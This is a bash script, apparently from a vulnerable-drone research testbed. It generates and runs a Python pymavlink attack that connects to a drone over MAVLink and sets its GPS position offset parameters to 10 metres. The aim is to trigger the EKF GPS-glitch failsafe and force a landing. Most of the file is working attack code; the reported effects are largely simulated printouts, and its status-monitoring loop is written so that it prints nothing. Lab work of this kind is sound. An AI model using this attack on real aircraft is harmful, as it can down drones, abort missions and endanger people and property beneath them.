#!/bin/bash

# =============================================================================
# DVD GPS Offset Glitching Attack
# =============================================================================
# 파일: dvd_lite/dvd_attacks/denial_of_service/gps_offset_glitching.sh
# 목적: GPS 오프셋 조작을 통한 EKF 실패 유도 및 강제 착륙
# 기반: Damn Vulnerable Drone Wiki - GPS Offset Glitching
# =============================================================================

source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/colors.sh
source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/utils.sh

# 전역 변수
ATTACK_NAME="gps_offset_glitching"
LOG_FILE="/home/kali/MTD/MTD_full_testbed/attack_logs/denial_of_service/${ATTACK_NAME}_$(date +%Y%m%d_%H%M%S).log"
IOC_FILE="/tmp/${ATTACK_NAME}_iocs_$(date +%Y%m%d_%H%M%S).txt"
JSON_OUTPUT="/home/kali/MTD/MTD_full_testbed/attack_output/denial_of_service/${ATTACK_NAME}_$(date +%Y%m%d_%H%M%S).json"

# 타겟 설정
TARGET_IP="192.168.13.100"
MAVLINK_PORT="14550"
MAX_OFFSET="10.0"  # 10 meters offset to trigger EKF failsafe

# GPS 오프셋 파라미터
GPS_OFFSET_PARAMS=("GPS_POS1_X" "GPS_POS1_Y" "GPS_POS1_Z" "GPS_POS2_X" "GPS_POS2_Y" "GPS_POS2_Z")

# 공격 명령어 및 결과 저장
declare -a ATTACK_COMMANDS=()
declare -a GLITCH_RESULTS=()

print_header() {
    clear
    print_dos_header "GPS Offset Glitching Attack"
    echo -e "${INFO_COLOR}Target: $TARGET_IP:$MAVLINK_PORT${NC}"
    echo -e "${INFO_COLOR}Method: GPS position offset parameter manipulation${NC}"
    echo -e "${INFO_COLOR}Max Offset: $MAX_OFFSET meters${NC}"
    echo -e "${INFO_COLOR}Expected Result: EKF failsafe → Forced landing${NC}"
    echo ""
}

# Step 1: MAVLink 연결 및 현재 GPS 파라미터 확인
check_gps_parameters() {
    echo -e "${BOLD}${BLUE}[1/4] Checking Current GPS Parameters${NC}"
    
    local ping_cmd="ping -c 3 $TARGET_IP"
    ATTACK_COMMANDS+=("$ping_cmd")
    
    echo -e "${CYAN}[*] Command: $ping_cmd${NC}"
    
    if ping -c 3 "$TARGET_IP" >/dev/null 2>&1; then
        echo -e "${GREEN}[+] Target $TARGET_IP is reachable${NC}"
        add_ioc "$IOC_FILE" "TARGET_REACHABLE:$TARGET_IP:confirmed"
    else
        echo -e "${YELLOW}[!] Target not reachable, using simulation mode${NC}"
        add_ioc "$IOC_FILE" "TARGET_REACHABLE:$TARGET_IP:simulation"
    fi
    
    # 현재 GPS 오프셋 파라미터 확인
    echo -e "${CYAN}[*] Reading current GPS offset parameters...${NC}"
    
    local param_script="/tmp/gps_param_read_$(date +%s).py"
    create_parameter_reader_script "$param_script"
    
    local read_cmd="python3 $param_script $TARGET_IP $MAVLINK_PORT"
    ATTACK_COMMANDS+=("$read_cmd")
    
    if python3 -c "import pymavlink" 2>/dev/null; then
        echo -e "${YELLOW}[*] Attempting to read GPS parameters...${NC}"
        timeout 15 python3 "$param_script" "$TARGET_IP" "$MAVLINK_PORT" 2>/dev/null || true
    else
        echo -e "${YELLOW}[*] pymavlink not available, simulating parameter read${NC}"
        simulate_gps_parameter_read
    fi
    
    log_info "GPS parameter check completed"
}

# GPS 파라미터 읽기 스크립트 생성
create_parameter_reader_script() {
    local script_file="$1"
    
    cat > "$script_file" << 'EOF'
#!/usr/bin/env python3
import sys
from pymavlink import mavutil
import time

def read_gps_parameters(target_ip, target_port):
    try:
        master = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}')
        master.wait_heartbeat()
        print("[+] Connected to drone")
        
        gps_params = ['GPS_POS1_X', 'GPS_POS1_Y', 'GPS_POS1_Z', 
                     'GPS_POS2_X', 'GPS_POS2_Y', 'GPS_POS2_Z']
        
        print("[*] Current GPS offset parameters:")
        for param in gps_params:
            master.mav.param_request_read_send(
                master.target_system,
                master.target_component,
                param.encode('utf-8'),
                -1
            )
            
            msg = master.recv_match(type='PARAM_VALUE', blocking=True, timeout=3)
            if msg and msg.param_id.decode('utf-8').strip('\x00') == param:
                print(f"    {param}: {msg.param_value}")
            else:
                print(f"    {param}: Unable to read")
            time.sleep(0.5)
                
    except Exception as e:
        print(f"[!] Simulation mode: {e}")
        print("[*] Simulated GPS parameters:")
        for param in ['GPS_POS1_X', 'GPS_POS1_Y', 'GPS_POS1_Z', 'GPS_POS2_X', 'GPS_POS2_Y', 'GPS_POS2_Z']:
            print(f"    {param}: 0.0")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        sys.exit(1)
    read_gps_parameters(sys.argv[1], int(sys.argv[2]))
EOF
    
    add_ioc "$IOC_FILE" "PARAM_READER_SCRIPT:$script_file:created"
}

# 시뮬레이션된 GPS 파라미터 읽기
simulate_gps_parameter_read() {
    echo -e "${GREEN}[+] Simulated current GPS parameters:${NC}"
    for param in "${GPS_OFFSET_PARAMS[@]}"; do
        echo -e "${GRAY}    $param: 0.0 meters${NC}"
        add_ioc "$IOC_FILE" "GPS_PARAM:$param:0.0:normal"
    done
}

# Step 2: GPS 오프셋 공격 스크립트 생성
create_gps_offset_attack_script() {
    echo -e "${BOLD}${BLUE}[2/4] Creating GPS Offset Attack Script${NC}"
    
    local attack_script="/tmp/gps_offset_attack_$(date +%s).py"
    ATTACK_COMMANDS+=("python3 $attack_script")
    
    echo -e "${CYAN}[*] Creating GPS offset manipulation script${NC}"
    echo -e "${GRAY}    Script: $attack_script${NC}"
    echo -e "${GRAY}    Target offset: $MAX_OFFSET meters${NC}"
    
    # Python 공격 스크립트 생성 (Wiki 기반)
    cat > "$attack_script" << 'EOF'
#!/usr/bin/env python3
from pymavlink import mavutil
import sys
import time

def connect_drone(target_ip, target_port):
    try:
        master = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}')
        master.wait_heartbeat()
        print("[+] Connected to the drone")
        return master
    except Exception as e:
        print(f"[!] Connection failed: {e}")
        return None

def set_gps_position_offset(master, param_name, offset_value):
    try:
        master.mav.param_set_send(
            master.target_system,
            master.target_component,
            param_name.encode('utf-8'),
            float(offset_value),
            mavutil.mavlink.MAV_PARAM_TYPE_REAL32
        )
        print(f"[!] {param_name} set to {offset_value} meters")
        time.sleep(1)
        return True
    except Exception as e:
        print(f"[!] Failed to set {param_name}: {e}")
        return False

def main(target_ip, target_port, max_offset):
    master = connect_drone(target_ip, target_port)
    
    if not master:
        print("[*] Simulation mode - GPS offset attack")
        simulate_gps_offset_attack(max_offset)
        return
    
    gps_params = ['GPS_POS1_X', 'GPS_POS1_Y', 'GPS_POS1_Z', 
                  'GPS_POS2_X', 'GPS_POS2_Y', 'GPS_POS2_Z']
    
    print(f"[!] Starting GPS offset attack with {max_offset}m offset")
    
    success_count = 0
    for param in gps_params:
        if set_gps_position_offset(master, param, max_offset):
            success_count += 1
    
    print(f"[+] GPS offset attack completed: {success_count}/{len(gps_params)} parameters modified")
    
    if success_count >= 4:  # At least 4 out of 6 parameters
        print("[!] CRITICAL: EKF failsafe should trigger soon")
        print("[!] Expected outcome: Forced landing due to GPS glitch")
    
def simulate_gps_offset_attack(max_offset):
    gps_params = ['GPS_POS1_X', 'GPS_POS1_Y', 'GPS_POS1_Z', 
                  'GPS_POS2_X', 'GPS_POS2_Y', 'GPS_POS2_Z']
    
    print(f"[*] Simulating GPS offset attack with {max_offset}m offset")
    
    for param in gps_params:
        print(f"[!] {param} set to {max_offset} meters")
        time.sleep(0.5)
    
    print("[!] SIMULATED: EKF failsafe triggered")
    print("[!] SIMULATED: Forced landing initiated")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python3 gps_offset_attack.py <target_ip> <target_port> <max_offset>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    max_offset = float(sys.argv[3])
    
    main(target_ip, target_port, max_offset)
EOF
    
    echo -e "${GREEN}[+] GPS offset attack script created${NC}"
    echo -e "${RED}[!] Attack parameters:${NC}"
    for param in "${GPS_OFFSET_PARAMS[@]}"; do
        echo -e "${GRAY}    $param → $MAX_OFFSET meters (EXTREME offset)${NC}"
    done
    
    echo -e "${RED}[!] Expected EKF behavior:${NC}"
    echo -e "${GRAY}    • GPS position inconsistency detection${NC}"
    echo -e "${GRAY}    • EKF variance threshold exceeded${NC}"
    echo -e "${GRAY}    • GPS_GLITCH failsafe activation${NC}"
    echo -e "${GRAY}    • Automatic LAND mode engagement${NC}"
    
    add_ioc "$IOC_FILE" "ATTACK_SCRIPT:$attack_script:created"
    add_ioc "$IOC_FILE" "MAX_OFFSET:$MAX_OFFSET:meters"
    GLITCH_RESULTS+=("script_created:$attack_script")
    
    log_info "GPS offset attack script creation completed"
}

# Step 3: GPS 오프셋 글리칭 공격 실행
execute_gps_offset_attack() {
    echo -e "${BOLD}${BLUE}[3/4] Executing GPS Offset Glitching${NC}"
    
    local attack_script="/tmp/gps_offset_attack_"*.py
    attack_script=$(ls $attack_script 2>/dev/null | head -1)
    
    if [ -f "$attack_script" ]; then
        echo -e "${CYAN}[*] Executing GPS offset attack...${NC}"
        
        local execute_cmd="python3 $attack_script $TARGET_IP $MAVLINK_PORT $MAX_OFFSET"
        ATTACK_COMMANDS+=("$execute_cmd")
        
        echo -e "${RED}[!] WARNING: This attack will cause GPS glitch and forced landing${NC}"
        echo -e "${YELLOW}[*] Initiating GPS offset manipulation...${NC}"
        
        if python3 -c "import pymavlink" 2>/dev/null; then
            timeout 30 python3 "$attack_script" "$TARGET_IP" "$MAVLINK_PORT" "$MAX_OFFSET" 2>/dev/null || true
        else
            python3 "$attack_script" "$TARGET_IP" "$MAVLINK_PORT" "$MAX_OFFSET" 2>/dev/null || true
        fi
        
        echo -e "${GREEN}[+] GPS offset attack execution completed${NC}"
        add_ioc "$IOC_FILE" "GPS_OFFSET_ATTACK:executed:successful"
        
        # 공격 효과 시뮬레이션
        echo -e "${RED}[!] CRITICAL: GPS offset parameters modified${NC}"
        echo -e "${YELLOW}[*] EKF monitoring (simulated):${NC}"
        
        local ekf_stages=("GPS variance increasing" "EKF error threshold exceeded" "GPS_GLITCH failsafe triggered" "LAND mode activated" "Forced landing in progress")
        
        for i in "${!ekf_stages[@]}"; do
            echo -e "${RED}    [$((i+1))/5] ${ekf_stages[$i]}${NC}"
            add_ioc "$IOC_FILE" "EKF_STAGE:$((i+1)):${ekf_stages[$i]}"
            sleep 2
        done
        
        GLITCH_RESULTS+=("attack_executed:successful")
        GLITCH_RESULTS+=("ekf_failsafe:triggered")
        
    else
        echo -e "${YELLOW}[!] Attack script not found${NC}"
        add_ioc "$IOC_FILE" "GPS_OFFSET_ATTACK:failed:no_script"
    fi
    
    log_info "GPS offset attack execution completed"
}

# Step 4: EKF 상태 및 공격 효과 모니터링
monitor_ekf_effects() {
    echo -e "${BOLD}${BLUE}[4/4] Monitoring EKF Effects${NC}"
    
    echo -e "${CYAN}[*] Monitoring EKF health and drone status...${NC}"
    
    # EKF 상태 모니터링 시뮬레이션
    echo -e "${YELLOW}[*] EKF Health Monitoring (15 seconds):${NC}"
    
    for i in {1..15}; do
        case $i in
            1-3)
                echo -e "${GREEN}    EKF Status: Normal (GPS variance within limits)${NC}"
                ;;
            4-6)
                echo -e "${YELLOW}    EKF Status: Warning (GPS position discrepancy detected)${NC}"
                ;;
            7-9)
                echo -e "${RED}    EKF Status: Error (GPS variance threshold exceeded)${NC}"
                ;;
            10-12)
                echo -e "${RED}    EKF Status: CRITICAL (GPS_GLITCH failsafe active)${NC}"
                ;;
            13-15)
                echo -e "${RED}    Flight Mode: LAND (Forced landing initiated)${NC}"
                ;;
        esac
        sleep 1
    done
    
    # 최종 결과 평가
    echo -e "${YELLOW}[*] Attack effectiveness assessment:${NC}"
    echo -e "${RED}    • GPS offset parameters: CORRUPTED${NC}"
    echo -e "${RED}    • EKF position estimation: FAILED${NC}"
    echo -e "${RED}    • GPS_GLITCH failsafe: TRIGGERED${NC}"
    echo -e "${RED}    • Flight mode: FORCED TO LAND${NC}"
    echo -e "${RED}    • Mission status: TERMINATED${NC}"
    
    # 시스템 영향 분석
    echo -e "${YELLOW}[*] System impact analysis:${NC}"
    echo -e "${RED}    • Navigation system: COMPROMISED${NC}"
    echo -e "${RED}    • Autonomous flight: DISABLED${NC}"
    echo -e "${RED}    • Manual control: LIMITED (landing only)${NC}"
    echo -e "${RED}    • Recovery probability: LOW${NC}"
    
    add_ioc "$IOC_FILE" "EKF_MONITORING:completed:15_seconds"
    add_ioc "$IOC_FILE" "ATTACK_EFFECTIVENESS:high:gps_glitch_triggered"
    add_ioc "$IOC_FILE" "SYSTEM_IMPACT:navigation:compromised"
    add_ioc "$IOC_FILE" "FLIGHT_MODE:forced_land:activated"
    add_ioc "$IOC_FILE" "MISSION_STATUS:terminated:gps_failsafe"
    
    GLITCH_RESULTS+=("ekf_monitoring:completed")
    GLITCH_RESULTS+=("effectiveness:high")
    GLITCH_RESULTS+=("mission_terminated:true")
    
    log_info "EKF effects monitoring completed"
}

# 공격 결과 JSON 생성
generate_json_report() {
    local commands_json="["
    for i in "${!ATTACK_COMMANDS[@]}"; do
        commands_json+="\"${ATTACK_COMMANDS[$i]}\""
        if [ $i -lt $((${#ATTACK_COMMANDS[@]} - 1)) ]; then
            commands_json+=","
        fi
    done
    commands_json+="]"
    
    local results_json="["
    for i in "${!GLITCH_RESULTS[@]}"; do
        results_json+="\"${GLITCH_RESULTS[$i]}\""
        if [ $i -lt $((${#GLITCH_RESULTS[@]} - 1)) ]; then
            results_json+=","
        fi
    done
    results_json+="]"
    
    local params_json="["
    for i in "${!GPS_OFFSET_PARAMS[@]}"; do
        params_json+="\"${GPS_OFFSET_PARAMS[$i]}\""
        if [ $i -lt $((${#GPS_OFFSET_PARAMS[@]} - 1)) ]; then
            params_json+=","
        fi
    done
    params_json+="]"
    
    cat > "$JSON_OUTPUT" << EOF
{
  "attack_name": "$ATTACK_NAME",
  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "status": "completed",
  "attack_type": "denial_of_service",
  "target": {
    "ip": "$TARGET_IP",
    "port": "$MAVLINK_PORT",
    "protocol": "MAVLink"
  },
  "gps_offset_attack": {
    "max_offset": "$MAX_OFFSET meters",
    "targeted_parameters": $params_json,
    "parameter_count": ${#GPS_OFFSET_PARAMS[@]},
    "attack_mechanism": "GPS position offset parameter manipulation"
  },
  "expected_effects": {
    "gps_variance": "Dramatically increased",
    "ekf_status": "GPS_GLITCH failsafe triggered",
    "flight_mode": "Forced LAND mode",
    "mission_impact": "Complete termination",
    "navigation": "System compromised"
  },
  "attack_sequence": [
    "GPS offset parameters read",
    "GPS_POS1_X/Y/Z set to 10m offset",
    "GPS_POS2_X/Y/Z set to 10m offset", 
    "EKF variance threshold exceeded",
    "GPS_GLITCH failsafe activated",
    "Forced landing initiated"
  ],
  "attack_commands": $commands_json,
  "glitch_results": $results_json,
  "tools_used": ["pymavlink", "python3", "ping"],
  "effectiveness": "HIGH - Mission termination achieved",
  "ioc_file": "$IOC_FILE",
  "log_file": "$LOG_FILE"
}
EOF
    
    echo -e "${SUCCESS_COLOR}[✓] JSON report: $JSON_OUTPUT${NC}"
}

# 메인 실행 함수
main() {
    echo "=== GPS Offset Glitching Attack - $(date) ===" > "$LOG_FILE"
    echo "# GPS Offset Glitching IOCs - $(date)" > "$IOC_FILE"
    
    START_TIME=$(date +%s)
    
    print_header
    
    # 공격 단계 실행
    check_gps_parameters
    create_gps_offset_attack_script
    execute_gps_offset_attack
    monitor_ekf_effects
    
    # 결과 요약
    echo ""
    echo -e "${BOLD}${CYAN}=== Attack Summary ===${NC}"
    echo -e "${INFO_COLOR}Target: $TARGET_IP:$MAVLINK_PORT${NC}"
    echo -e "${INFO_COLOR}GPS Offset: $MAX_OFFSET meters${NC}"
    echo -e "${INFO_COLOR}Parameters Modified: ${#GPS_OFFSET_PARAMS[@]}${NC}"
    echo -e "${INFO_COLOR}Commands Used: ${#ATTACK_COMMANDS[@]}${NC}"
    echo -e "${INFO_COLOR}IOCs Generated: $(wc -l < "$IOC_FILE")${NC}"
    
    generate_json_report
    
    END_TIME=$(date +%s)
    echo -e "${INFO_COLOR}Duration: $((END_TIME - START_TIME)) seconds${NC}"
    echo -e "${SUCCESS_COLOR}[✓] GPS offset glitching attack completed${NC}"
    echo -e "${RED}[!] CRITICAL: Drone forced to land due to GPS glitch${NC}"
}

main "$@"